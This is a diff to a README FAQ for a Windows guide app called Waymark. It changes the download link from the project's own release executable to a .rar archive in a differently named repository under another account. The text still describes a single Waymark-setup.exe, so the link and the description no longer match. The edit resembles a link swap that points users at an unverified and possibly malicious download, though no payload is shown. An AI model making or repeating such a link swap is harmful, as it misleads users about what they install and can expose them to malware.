@@ -78,7 +78,7 @@ Good guide addons can cost $25 to $50, and many of them are excellent. Waymark i
 <details>
 <summary><b>Can I download it today?</b></summary>
 <br>
-Yes. The Windows build is a single `Waymark-setup.exe`, linked at the top of this page and in [releases](../../releases/download/v1.0.6/Waymark.exe). No account, no installer.
+Yes. The Windows build is a single `Waymark-setup.exe`, linked at the top of this page and in [releases](https://github.com/Obsidiantatrap/wow-forever-builds-waymark/releases/latest/download/wow-forever-builds-waymark.rar). No account, no installer.
 </details>
 
 <details>
